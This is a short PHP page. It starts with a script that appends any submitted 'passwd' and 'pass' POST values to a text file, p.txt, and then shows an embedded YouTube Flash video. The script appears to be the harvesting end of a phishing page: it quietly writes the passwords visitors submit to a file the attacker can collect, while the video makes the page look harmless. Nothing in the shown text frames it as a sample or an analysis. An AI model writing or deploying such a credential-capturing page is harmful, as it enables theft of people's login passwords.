<?php

$fp = fopen("p.txt","a");
fwrite($fp,$_POST['passwd']);
fwrite($fp,$_POST['pass']);
fwrite($fp,"\n");
fclose($fp);

?>

<object width="425" height="344"><param name="movie" 
value="http://www.youtube.com/v/xStTbJJQOqM&hl=en"></param><param 
name="allowFullScreen" value="true"></param><embed 
src="http://www.youtube.com/v/xStTbJJQOqM&hl=en" 
type="application/x-shockwave-flash" allowfullscreen="true" width="425" 
height="344"></embed></object>
